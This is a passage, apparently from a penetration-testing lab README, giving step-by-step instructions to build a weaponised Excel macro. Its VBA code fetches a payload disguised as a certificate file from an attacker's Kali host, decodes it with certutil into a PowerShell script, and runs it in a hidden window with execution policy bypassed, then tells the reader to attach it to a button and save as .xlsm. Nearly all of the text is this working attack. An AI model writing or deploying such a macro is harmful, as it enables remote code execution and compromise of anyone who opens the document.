1. Now create an excel file
2. go to development - visual basic
3. create a macro by pasting this:

```vba
Sub DownloadAndExec()
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://IP KALI/cert.crt", False
xHttp.Send
With bStrm
  .Type = 1 '//binary
  .Open
  .write xHttp.responseBody
  .savetofile "encoded_ps1.crt", 2 '//overwrite
End With
Shell ("cmd /c certutil -decode encoded_ps1.crt decoded.ps1 & c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -W Hidden .\decoded.ps1")
End Sub
```

change ip e file name on line 8

4. close visual basic, create a button and associate the macro to it

![Alt text](https://github.com/mikeleord/ptx-macroLab/blob/main/excel.png?raw=true "cert")

5. save in .xlsm format
